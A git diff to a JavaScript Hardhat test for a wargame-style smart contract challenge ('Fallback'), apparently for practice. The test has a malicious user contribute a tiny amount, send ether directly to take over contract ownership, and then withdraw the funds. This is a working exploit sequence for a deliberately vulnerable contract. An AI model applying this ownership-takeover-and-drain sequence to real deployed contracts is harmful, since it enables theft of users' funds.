@@ -12,6 +12,8 @@ describe("Challenge 1 - Fallback", function() {
         const vulnerableContract = await Fallback.deploy()
         await vulnerableContract.deployed()
 
+        console.log(`contract deployed to ${vulnerableContract.address}`)
+
         return {initialVictimFunds, deployer, regularUser, maliciousUser, vulnerableContract}
     }
 
@@ -60,16 +62,19 @@ describe("Challenge 1 - Fallback", function() {
             const contributionValue = "0.00001"
             let tx = await vulnerableContract.connect(maliciousUser).contribute({value: ethers.utils.parseEther(contributionValue)})
             await tx.wait()
-            const attackerContribution = await vulnerableContract.connect(maliciousUser).getContribution()
 
+            const attackerContribution = await vulnerableContract.connect(maliciousUser).getContribution()
             expect(ethers.utils.formatEther(attackerContribution)).to.equal(contributionValue)
 
             tx = await maliciousUser.sendTransaction({to:vulnerableContract.address, value:ethers.utils.parseEther(contributionValue)})
             await tx.wait()
 
+            tx = await vulnerableContract.connect(maliciousUser).withdraw()
+            await tx.wait()
+
             expect(await vulnerableContract.owner()).is.equal(maliciousUser.address)
-            await expect(vulnerableContract.withdraw()).to.be.revertedWith("caller is not the owner")            
-            await expect(vulnerableContract.connect(maliciousUser).withdraw()).not.to.be.reverted
+            await expect(vulnerableContract.withdraw()).to.be.revertedWith("caller is not the owner")
+            //await expect(vulnerableContract.connect(maliciousUser).withdraw()).not.to.be.reverted
         })
     })
 })
